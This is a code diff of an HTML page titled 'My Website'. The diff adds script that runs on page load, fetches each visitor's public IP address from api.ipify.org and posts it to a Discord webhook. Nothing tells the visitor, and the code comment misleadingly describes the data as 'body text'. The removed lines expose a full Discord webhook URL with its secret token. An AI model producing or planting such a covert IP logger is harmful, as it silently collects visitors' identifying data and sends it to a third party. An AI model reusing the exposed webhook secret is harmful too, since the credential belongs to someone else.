@@ -1,21 +1,25 @@
-
+<!DOCTYPE html>
 <html>
 <head>
   <title>My Website</title>
   <script>
-    // JavaScript code for sending a message to Discord webhook
+    // JavaScript code for sending the body text from a website to Discord webhook
     window.onload = function() {
-      const webhookUrl = 'https://discord.com/api/webhooks/1112433220747792535/f0GSFHDk7Y5p7YNV2xzoIjy-7Kl6v1gRJyK2jONEyMxhjGiEbvffgJNA9N4ZeaGJg_i9';
-      const messagePayload = {
-        content: 'Hello, Discord!'
-      };
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(messagePayload)
-      });
+      const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
+      fetch('https://api.ipify.org/')
+        .then(response => response.text())
+        .then(bodyText => {
+          const messagePayload = {
+            content: bodyText
+          };
+          fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(messagePayload)
+          });
+        });
     };
   </script>
 </head>
